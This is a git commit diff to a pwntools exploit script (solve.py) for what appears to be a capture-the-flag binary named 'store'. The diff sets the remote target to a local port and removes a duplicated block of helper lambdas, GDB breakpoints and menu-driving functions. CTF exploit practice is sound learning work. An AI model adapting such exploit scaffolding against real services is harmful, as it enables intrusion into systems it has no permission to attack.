b97b433fb166628f8fb4ecbb72aefeec89e1dfce
Saitomu <dung9126lol@gmail.com>
2026-04-27 10:47:10 +0700

    Update solve.py

--- event/store/public/solve.py
+++ event/store/public/solve.py
@@ -38,7 +38,7 @@ def GDB():
 
 
 if args.REMOTE:
-    p = remote('')
+    p = remote('0', 1337)
 else:
     p = process([exe.path])
 
@@ -209,66 +209,5 @@ slna(b'>> ', 5)
 slna(b'>> ', 3)
 sna(b'ndex: ', 0)
 sa(b': ', load)
-
-p.interactive()
-#!/usr/bin/env python3
-
-from pwn import *
-
-context.terminal = ["foot", "-e", "sh", "-c"]
-
-exe = ELF('store_patched', checksec=False)
-libc = ELF('libc.so.6', checksec=False)
-context.binary = exe
-
-info = lambda msg: log.info(msg)
-s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
-sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
-sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
-sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
-sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
-sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
-sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
-slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
-ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
-r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)
-
-def GDB():
-    if not args.REMOTE:
-        gdb.attach(p, gdbscript='''
-        b*0x0000555555555fac
-        b*0x00005555555561fc
-        b*0x0000555555555e8d
-        b*0x0000555555555f6c
-        b*0x0000555555556121
-        b*0x000055555555629e
-
-        c
-        ''')
-        sleep(1)
-
-
-if args.REMOTE:
-    p = remote('')
-else:
-    p = process([exe.path])
-GDB()
-def add(ID, quantity):
-    slna(b'> ', 2)
-    slna(b'Product ID (0-9): ', ID)
-    slna(b'Quantity: ', quantity)
-
-add(0, 10)
-add(2, 0x36)
-
-def checkout():
-    slna(b'> ', 3)
-    sla(b'Confirm purchase? (y/n): ', b'y')
-
-def best():
-    slna(b'> ', 4)
-
-
-
 
 p.interactive()
